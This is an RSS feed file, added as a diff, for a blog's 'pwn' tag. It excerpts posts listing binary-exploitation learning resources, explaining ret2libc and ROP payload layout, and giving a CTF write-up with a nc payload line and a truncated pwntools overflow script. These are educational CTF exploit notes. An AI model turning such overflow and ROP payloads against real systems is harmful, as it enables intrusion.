@@ -1,0 +1,57 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>pwn on Zet’s playground</title>
+    <link>https://blog.zet.tw/tags/pwn/</link>
+    <description>Recent content in pwn on Zet’s playground</description>
+    <image>
+      <url>https://blog.zet.tw/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</url>
+      <link>https://blog.zet.tw/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</link>
+    </image>
+    <generator>Hugo -- gohugo.io</generator>
+    <lastBuildDate>Tue, 09 Jan 2018 00:00:00 +0800</lastBuildDate><atom:link href="https://blog.zet.tw/tags/pwn/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>How to pwnalbe</title>
+      <link>https://blog.zet.tw/posts/2018-01-09-how-to-pwnable/</link>
+      <pubDate>Tue, 09 Jan 2018 00:00:00 +0800</pubDate>
+      
+      <guid>https://blog.zet.tw/posts/2018-01-09-how-to-pwnable/</guid>
+      <description>陸續更新～
+website, doc and video https://ctf-wiki.github.io/ctf-wiki LiveOverflow youtube channel https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w http://liveoverflow.com/binary_hacking/protostar/index.html Heap 手法整理 https://github.com/shellphish/how2heap 日本選手的一系列投影片 http://www.slideshare.net/bata_24/presentations 杨坤：掘金CTF ——CTF中的内存漏洞利用技巧 http://netsec.ccert.edu.cn/wp-content/uploads/2015/10/2015-1029-yangkun-Gold-Mining-CTF.pdf Modern Binary Exploitation by RPISEC http://security.cs.rpi.edu/courses/binexp-spring2015/ https://github.com/RPISEC/MBE https://raintrees.net/projects/a-painter-and-a-black-cat/wiki/CTF_Pwn inaz2 整理的 exploit 手法 http://inaz2.hatenablog.com/archive/category/Exploit?page=1 http://inaz2.hatenablog.com/archive/category/Exploit?page=2 http://j00ru.vexillium.org/blog/24_03_15/dragons_ctf.pdf https://github.com/str4tan/pwning Heap: https://github.com/cloudburst/libheap https://github.com/DhavalKapil/libdheap https://github.com/degrigis/Heapy https://github.com/shellphish/how2heap wargame and ctf https://pwnable.tw/ http://pwnable.kr/ https://bamboofox.cs.nctu.edu.tw/ http://overthewire.org/wargames/ https://w3challs.com/ https://exploit-exercises.com/nebula/ http://ctf.katsudon.org/ http://ctf.katsudon.org/ctf4u/ tools debug
+https://github.com/snare/voltron </description>
+    </item>
+    
+    <item>
+      <title>Return Oriented Programming</title>
+      <link>https://blog.zet.tw/posts/2016-05-31-rop/</link>
+      <pubDate>Tue, 31 May 2016 00:00:00 +0800</pubDate>
+      
+      <guid>https://blog.zet.tw/posts/2016-05-31-rop/</guid>
+      <description>整理一下
+找 getgads 工具  rp++ ROPgadget  Ret2libc 當程式有打開NX的時候造成 stack 上的 shellcode 無法執行，可以利用ret2libc或是利用ROP做mprotect開一個rwx的段，
+參數傳遞  x86 利用stack x86_64 利用reg  Ret2libc 疊法 可以盡可能的把參數疊完整，比較不會發生一些鳥問題
+一般x86的疊法是：
+padding + function + ret address + argv1 + argv2 + argv3 .... 一般 function 可以直接跳 .plt ， ret address 是執行完以後我要去的地方，假如一般疊出 system(&amp;quot;/bin/sh&amp;quot;)，ret address 可以直接填空沒關係
+例如 :
+&amp;#39;A&amp;#39;*100 + p32(system_addr) + p32(0) + p32(binsh_addr) x64: 利用一些 pop reg 的getgads把reg設定好
+x32 參數直接疊在stack上，用 pop_ret 清掉用過的參數
+read @ plt pop_pop_pop_ret 0 addr length system @ plt x86_64  最大地址 0x00007fffffffffff  DynELF 假如在不知道對方libc 的情況下可以使用pwntools中的一個工具DynELF，給他一個leak的點，可以幫你找出function的位置</description>
+    </item>
+    
+    <item>
+      <title>AIS3 pwn</title>
+      <link>https://blog.zet.tw/posts/2015-11-24-ais3-pwn/</link>
+      <pubDate>Tue, 24 Nov 2015 00:00:00 +0800</pubDate>
+      
+      <guid>https://blog.zet.tw/posts/2015-11-24-ais3-pwn/</guid>
+      <description>簡單紀錄一下
+PWN1 丟進ida 可以看到
+if ( v4 == 0x90909090 ) result = puts(aCensordCensord); else result = printf(&amp;#34;Your point is only %d, try hard!\n&amp;#34;, v4, v1, v2, v3); return result; 直接塞90結束
+python -c &amp;#39;print &amp;#34;\x90&amp;#34;*1000&amp;#39; | nc 52.69.163.194 1111 PWN2 定位到地20個字以後可以控制eip
+gdb-peda$ info functions All defined functions: Non-debugging symbols: 0x08048364 _init 0x080483a0 read@plt 可以指到read上,一般來說長這樣
+call ret argv1 ￼argv2 argv3 可以控制read的返回地址跟參數,所以可以把ret跟我們shellcode 指到同一個位置上,shellcode的話隨便找一段空⽩白的地⽅方寫上去就好
+from pwn import * import time r = remote(&amp;#39;127.0.0.1&amp;#39;, 4000) read_adr = &amp;#34;\xa0\x83\x04\x08&amp;#34; read = &amp;#34;\x00\x00\x00\x00&amp;#34; + &amp;#34;\x00\xa1\x04\x08&amp;#34; + &amp;#34;\x00\x01\x00\x00&amp;#34; p = &amp;#34;a&amp;#34;*20 + read_adr + &amp;#34;\x00\xa1\x04\x08&amp;#34; + read r.</description>
+    </item>
+    
+  </channel>
+</rss>
